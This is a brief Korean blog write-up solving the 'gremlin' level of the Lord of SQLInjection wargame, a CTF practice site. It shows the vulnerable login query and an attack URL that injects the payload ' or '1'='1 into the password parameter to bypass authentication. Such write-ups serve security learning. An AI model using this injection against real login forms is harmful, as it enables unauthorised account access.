---
title: "Lord of SQLInjection: gremlin"
date: 2025-01-21
summary: ""
category: "보안/CTF 풀이"
tags: ["CTF", "웹 보안"]
sourceUrl: "https://learntoflyclotilde.tistory.com/entry/Lord-of-SQLInjection-gremlin"
draft: false
---

## **{{color:#52643c}}Problem{{/color}}**

![Lord of SQLInjection: gremlin 이미지 1](/assets/posts/los-gremlin/image-01.png)

---

## **{{color:#52643c}}Solve{{/color}}**

- **기존 구문 → {{bg:#e5ebdb}}GET 방식{{/bg}}**

```

select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}’

```

- **변경 구문**

```

select id from prob_gremlin where id='admin' and pw='admin' or '1'='1#’

```

- **공격 구문**

```

https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=admin&pw=admin' or '1'='1

```

---

![Lord of SQLInjection: gremlin 이미지 2](/assets/posts/los-gremlin/image-02.png)
